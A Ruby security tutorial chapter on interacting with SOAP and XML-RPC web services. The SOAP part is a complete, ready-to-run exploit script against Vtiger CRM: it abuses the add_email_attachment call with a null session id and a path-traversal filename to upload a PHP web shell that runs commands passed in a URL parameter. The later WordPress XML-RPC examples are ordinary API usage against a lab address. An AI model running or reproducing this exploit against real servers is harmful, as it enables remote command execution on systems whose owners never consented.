# Interacting with Web Services

### SOAP - WSDL
Generally speaking, dealing with SOAP means dealing with XMLs that which WSDL describes how to use that SOAP. Ruby has really elegant way to do so and let's to get our hand dirty with an exploit

```
gem install savon httpclient
```

This is a working exploit for Vtiger CRM SOAP from Auth-bypass to Shell upload 
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
# gem install savon httpclient
#
require 'savon'

if ARGV.size < 1
  puts "[+] ruby #{__FILE__} [WSDL URL]"
  exit 0
else
  url = ARGV[0]
end

shell_data, shell_name = "<?php system($_GET['cmd']); ?>", "shell-#{rand(100)}.php"

# Start client 
client = Savon::Client.new(wsdl: url)

# List all avialable operations 
puts "[*] List all available operations "
puts client.operations

puts "\n\n[*] Interact with :add_email_attachment operation"
response = client.call( :add_email_attachment, 
                        message: {
                                     emailid:  rand(100),
                                     filedata: [shell_data].pack("m0"),
                                     filename: "../../../../../../#{shell_name}",
                                     filesize: shell_data.size,
                                     filetype: "php",
                                     username: "KING", 
                                     sessionid: nil
                                }
                      )
puts "[+] PHP Shell on:  http://#{URI.parse(url).host}/vtigercrm/soap/#{shell_name}?cmd=id"

```



### XML-RPC
Ruby has a [standard library][2] called `xmlrpc` which take care of all xmlrpc stuff you can even create an xmlrpc server using it. Let's  to get  Some real word example 

Looking for really known application that support XMLRPC then of course Wordpress was the first attendee. 

So what do we want to do?
- Say hello to wordpress 
- List all available methods
- List all available users
- List all available post
- Create a new post!
- Retrieve created post 


```ruby
require 'xmlrpc/client'

opts =
    {
        host: '172.17.0.2',
        path: '/xmlrpc.php',
        port: 80,
        proxy_host: nil,
        proxy_port: nil,
        user: 'admin',
        password: '123123',
        use_ssl: false,
        timeout: 30
    }

server = XMLRPC::Client.new(
    opts[:host], opts[:path], opts[:port],
    opts[:proxy_host], opts[:proxy_port],
    opts[:user], opts[:password],
    opts[:use_ssl], opts[:timeout]
)

server = XMLRPC::Client.new3(opts)

# Say hello to wordpress
response = server.call("demo.sayHello")

# List all available methods
server.call('system.listMethods', 0)

# List all available users
server.call('wp.getAuthors', 0, opts[:user], opts[:password])

# List all available post
response = server.call('wp.getPosts', 0, opts[:user], opts[:password])

# Create a new post!
post =
    {
        "post_title"     => 'Rubyfu vs WP XMLRPC',
        "post_name"      => 'Rubyfu vs Wordpres XMLRPC',
        "post_content"   => 'This is Pragmatic Rubyfu Post. Thanks for reading',
        "post_author"    => 2,
        "post_status"    => 'publish',
        "comment_status" => 'open'
    }
response = server.call("wp.newPost", 0, opts[:user], opts[:password], post)

# Retrieve created post
response =  server.call('wp.getPosts', 0, opts[:user], opts[:password], {"post_type" => "post", "post_status" => "published", "number" => "2", "offset" => "2"})

# List all comments on a specific post
response =  server.call('wp.getComments', 0, opts[:user], opts[:password], {"post_id" => 4})

```

Results 

```
```

and here is the new post
![](webfu__xmlrpc1.png)









<br><br><br>
---
[1]:
[2]: http://ruby-doc.org/stdlib-2.2.3/libdoc/xmlrpc/rdoc/XMLRPC/Client.html
